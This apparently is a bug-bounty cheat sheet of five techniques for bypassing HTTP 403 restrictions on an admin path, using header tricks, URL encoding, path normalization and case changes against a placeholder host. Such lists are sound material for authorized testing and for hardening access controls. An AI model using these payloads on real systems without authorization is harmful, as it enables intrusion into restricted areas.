# 403 Forbidden Bypass

1. Using "X-Original-URL" header
```
GET /admin HTTP/1.1
Host: target.com
```
Try this to bypass
```
GET /anything HTTP/1.1
Host: target.com
X-Original-URL: /admin
```

2. Appending **%2e** after the first slash
```
http://target.com/admin => 403
```
Try this to bypass
```
http://target.com/%2e/admin => 200
```

3. Try add dot (.) and slash (/) in the URL
```
http://target.com/admin => 403
```
Try this to bypass
```
http://target.com/admin/. => 200
http://target.com//admin// => 200
http://target.com/./admin/./ => 200
```

4. Add "..;/" after the directory name
```
http://target.com/admin
```
Try this to bypass
```
http://target.com/admin..;/
```


5. Try to uppercase the alphabet in the url
```
http://target.com/admin
```
Try this to bypass
```
http://target.com/aDmIN
```

Source: [@iam_j0ker](https://twitter.com/iam_j0ker)
